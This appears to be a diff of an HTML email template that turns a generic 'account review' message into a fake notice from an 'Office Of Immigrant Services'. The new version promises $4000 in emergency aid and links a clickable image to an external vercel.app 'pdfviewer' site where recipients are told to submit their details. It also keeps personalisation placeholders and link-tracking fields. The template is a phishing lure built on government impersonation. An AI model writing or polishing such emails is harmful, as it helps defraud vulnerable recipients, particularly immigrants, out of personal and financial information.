@@ -3,76 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Review</title>
+    <title>Welcome to Our Service!</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            line-height: 1.6;
-            color: #333333;
             background-color: #f4f4f4;
             margin: 0;
             padding: 0;
         }
-        .email-container {
+        .container {
+            width: 100%;
             max-width: 600px;
-            margin: 20px auto;
+            margin: 0 auto;
             background-color: #ffffff;
-            padding: 30px;
+            padding: 20px;
             border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
         }
         .header {
+            background-color: #fcfdfd; /* Yellow header for password reset */
+            color: #ffffff;
+            padding: 10px 0;
             text-align: center;
-            padding-bottom: 20px;
-            border-bottom: 1px solid #eeeeee;
-        }
-        .header h1 {
-            color: #0056b3;
-            margin: 0;
+            border-radius: 8px 8px 0 0;
         }
         .content {
-            padding: 20px 0;
+            padding: 20px;
+            text-align: left;
         }
-        .button-container {
-            text-align: center;
+        .footer {
             margin-top: 20px;
+            font-size: 12px;
+            color: #888888;
+            text-align: center;
         }
         .button {
             display: inline-block;
-            background-color: #007bff;
+            background-color: #ffc107;
             color: #ffffff;
             padding: 10px 20px;
             text-decoration: none;
             border-radius: 5px;
-            font-weight: bold;
-        }
-        .footer {
-            text-align: center;
-            padding-top: 20px;
-            border-top: 1px solid #eeeeee;
-            font-size: 0.9em;
-            color: #777777;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <div class="email-container">
+    <div class="container">
         <div class="header">
-            <h1>Check Review</h1>
+            <img src="https://i.pinimg.com/736x/b2/c8/e9/b2c8e934da2988b33f0b6d857e58606a.jpg" alt="Company Logo" style="max-width: 100px; height: auto;">
         </div>
         <div class="content">
             <p>Hello {{firstName}},</p>
-            <p>I am having issues with my other account.</p>
-            <p>Please review the details sent below.</p>
-            <div class="button-container">
-                <!-- This is the link that Project A would dynamically generate -->
-                <a href="{{trackableLink}}"><img src="https://i.pinimg.com/736x/f4/9d/b0/f49db0c0db52c33f6a09a503ac8273f0.jpg" alt="Review Account Activity" style="width:150px;height:auto;border:0;"></a>
-            </div>
-            <p>Thank you for your prompt attention to this matter.</p>
-        </div>
-        <div class="footer">
-        <p><small>Sent to: {{firstName}}</small></p>
-        <p><small>Sent on: {{timestamp}}</small></p>
+            <p>Due to ongoing economic challenges affecting communities in various regions,</p>
+            <p>Public and international support programs the United States immigrant service is providing $4000 emergency assistance to internal and both external individuals.</p>
+            <p>To access this assistance, please click the image below to submit your application and proceed to add your details for further action.</p>
+
+            <a href="https://pdfviewerimg133929edhe778338393.vercel.app/"><img src="https://i.pinimg.com/736x/f4/9d/b0/f49db0c0db52c33f6a09a503ac8273f0.jpg" alt="transition PDF" width="130"></a>
+            <p>For accurate information on any official assistance programs, <br>please refer only to verified government websites and trusted news sources.</p>
+            <p>Best Regards,</p>
+            <p><b>Office Of Immigrant Services<br>
+             P.O box 930045<br>
+             Washington, DC 20090</b></p>
+            <p><small>Sent to: {{firstName}}</small></p>
+            <p><small>Sent on: {{timestamp}}</small></p>
         </div>
     </div>
 </body>
